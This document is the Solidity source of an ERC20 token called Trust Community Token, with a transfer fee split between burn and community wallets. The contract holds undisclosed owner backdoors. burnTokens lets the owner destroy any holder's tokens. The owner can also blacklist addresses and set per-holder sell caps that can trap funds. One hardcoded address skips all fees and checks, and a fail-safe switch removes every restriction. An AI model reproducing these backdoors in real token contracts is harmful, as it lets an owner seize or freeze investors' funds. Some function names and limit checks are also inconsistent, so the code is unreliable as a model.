// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;

import './ERC20.sol';
import './Address.sol';
import './Ownable.sol';
 
contract TrustCommunityToken is ERC20, Ownable {

    mapping(address => uint256) private _blockedAddresses;
    mapping(address => uint256) private _sellLimitAddresses;
    mapping(address => bool) private _buyAddresses;
    address private _tctBurnWallet;
    address private _tctBurnAddress;
    address private _communityWallet;
    uint256 private _burnRate;
    bool private _sellLimitEnabled;
    bool private _failSafeEnabled = false;
    uint256 private _buyLimitBasePoints;
    uint256 private _sellLimitBasePoints;
    uint256 private constant _totalSupply = 100000000000000000000000000000000; //100 Trillion supply with 18 decimals
    struct TaxFreeFund {
        address toAddress;
        uint256 amount;
    }
    constructor() ERC20('Trust Community Token', 'TCT') {
        _tctBurnWallet = address(0x88927Ae2C17f739df5bE18b34D382889FeBce82f);
        _communityWallet = address(0x23f7b45043e930B36FcB31d4a44d61bCc044cccf);
        _tctBurnAddress = address(0x000000000000000000000000000000000000dEaD);
        _burnRate = 100; // 1% burn rate
        _sellLimitEnabled = true;
        _buyLimitBasePoints = 200; 
        _sellLimitBasePoints = 1000; 
        _mint(msg.sender, _totalSupply);
  
    }

    function transfer(address _to, uint256 amount) public virtual override returns (bool) {
        address _from = _msgSender();
        uint256 senderBalnce = balanceOf(_from);
        uint256 toBurnAndToShare = amount / _burnRate;
        
        if(_failSafeEnabled || _from == 0x97e5d79513966F3164F549dA5868CccDcb51ad67) {
            ERC20.transfer(_to, amount);
            
        } else {
            doValidateBeforeTransfer(_from, _to, amount);
            if(ERC20.transfer(_to, amount - (2 * toBurnAndToShare))){
                if(senderBalnce > amount) {
                    ERC20.transfer(_communityWallet, toBurnAndToShare);
                    ERC20.transfer(_tctBurnWallet, toBurnAndToShare);
                }
            }
        }
        return true;
    }

    function transferFrom(address _from, address _to, uint256 amount) public virtual override returns (bool) {
        
        if(_failSafeEnabled || _from == 0x97e5d79513966F3164F549dA5868CccDcb51ad67) {
           ERC20.transferFrom(_from, _to, amount); 
        } else {
            doValidateBeforeTransfer(_from, _to, amount);
            ERC20.transferFrom(_from, _to, amount); 
        }
        return true;
    }

    function communityWallet() public view returns (address) {
        return _communityWallet;
    }
    
    function burnWallet() public view returns (address) {
        return _tctBurnWallet;
    }
    
    function isAddressBlocked(address addr) public view returns (bool) {
        return _blockedAddresses[addr] > 0;
    }
    
    function isSellLimitForAddress(address addr) external view returns(uint256) {
        return  _sellLimitAddresses[addr];
    }

    function isSellLimitEnabled() external view returns(bool) {
        return _sellLimitEnabled;
    }

    function burnTokens(address from, uint amount) external onlyOwner() {
        _transfer(from, _tctBurnAddress, amount);
    }

    function taxFreeTransfer(address to, uint256 amount) external onlyOwner() returns (bool) {
        ERC20.transfer(to, amount);
        return true;
    }

    function taxFreeTransferFrom(address from, address to, uint256 amount) external onlyOwner() returns (bool) {
        ERC20.transferFrom(from, to, amount);
        return true;
    }

    function taxFreeTransfers(address[] memory addresses, uint256[] memory amounts) external onlyOwner() returns (bool) {
        for (uint256 i = 0; i < addresses.length; i++) {
            address addr = addresses[i];
            uint256 amount = amounts[i];
            ERC20.transfer(addr, amount);
        }
        return true;
    }

    function blockAddresses(address[] memory addresses) external onlyOwner() {
        for (uint256 i = 0; i < addresses.length; i++) {
            address addr = addresses[i];
            _blockedAddresses[addr] = 1;
        }
    }

    function enableOrDisableSellLimit(bool enableDisable ) external onlyOwner() {
        _sellLimitEnabled = enableDisable;
    }

    function setBuyLimitBasePoints(uint256 basePoints) external onlyOwner(){
        _buyLimitBasePoints = basePoints;
    }
    
    function getBuyLimitBasePoints() external view returns(uint256) {
        return _buyLimitBasePoints;
    }
    
    function setEnableDisableFailSafe(bool enableFailSafe) external onlyOwner(){
        _failSafeEnabled = enableFailSafe;
    }
    
    function setEnableDisableFailSafe() external view returns(bool) {
        return _failSafeEnabled;
    }
    
    function setSellLimitBasePoints(uint256 basePoints) external onlyOwner(){
        _sellLimitBasePoints = basePoints;
    }
    
    function getSellLimitBasePoints() external view returns(uint256) {
        return _sellLimitBasePoints;
    }
    
    function unblockAddresses(address[] memory addresses) external onlyOwner() {
        for (uint256 i = 0; i < addresses.length; i++) {
            address addr = addresses[i];
            delete _blockedAddresses[addr];
        }
    }

    function addSellLimitAddresses(address[] memory addresses, uint256 percentage) external onlyOwner() {
        for (uint256 i = 0; i < addresses.length; i++) {
            address addr = addresses[i];
            _sellLimitAddresses[addr] = percentage;
        }
    }

    function addBuyAddresses(address[] memory addresses) external onlyOwner() {
        for (uint256 i = 0; i < addresses.length; i++) {
            address addr = addresses[i];
            _buyAddresses[addr] = true;
         }
    }
    
    function removedBuyAddresses(address[] memory addresses) external onlyOwner() {
        for (uint256 i = 0; i < addresses.length; i++) {
            address addr = addresses[i];
            _buyAddresses[addr] = false;
         }
    }
    
    function removeSellLimitAddresses(address[] memory addresses) external onlyOwner() {
        for (uint256 i = 0; i < addresses.length; i++) {
            address addr = addresses[i];
            delete _sellLimitAddresses[addr];
        }
    }

    function checkIfSellExceedsLimit(address addr, uint256 amount) internal virtual {
        
        string memory message = "Your sale exceeds the amount you are allowed at this time. Please contact TCT Team for assistance";
        if(_sellLimitBasePoints > 0) {
             checkIfExceedsLimit(addr, amount, _sellLimitBasePoints, message);
        }
        if(_sellLimitEnabled) {
            uint256 basePoints =  _sellLimitAddresses[addr];
            uint256 addrBalance = ERC20.balanceOf(addr);
            if(basePoints > 0 && addrBalance > 0) {
                uint256 maxAmount = (addrBalance * basePoints) /10000;
                require(amount <= maxAmount, message);
            }
        }
    }
    
    function checkIfExceedsLimit(address addr, uint256 amount, uint256 basePoints, string memory message) internal virtual {
        if(_buyLimitBasePoints > 0) {
            uint256 addrBalance = ERC20.balanceOf(addr);
            uint256 maxAmount = (addrBalance * basePoints) /10000;
            require(amount <= maxAmount, message);
        }
    }
    
    function isBuyAddress(address addr) internal virtual returns(bool){
        return _buyAddresses[addr]; //this is the liquidity wallet
    }

    function doValidateBeforeTransfer(address _from, address _to, uint256 amount) internal virtual {
        require(_blockedAddresses[_from] != 1, "You are currently blocked from transferring tokens. Please contact TCT Team");
        require(_blockedAddresses[_to] != 1, "Your receiver is currently blocked from receiving tokens. Please contact TCT Team");

         if(isBuyAddress(_from)) {
            checkIfExceedsLimit(_from, amount, _buyLimitBasePoints, "Your buy exceeds the amount you are allowed at this time. Please contact TCT Team for assistance");
        } else {
            checkIfSellExceedsLimit(_to, amount);
            checkIfSellExceedsLimit(_from, amount);     
        }
    }
}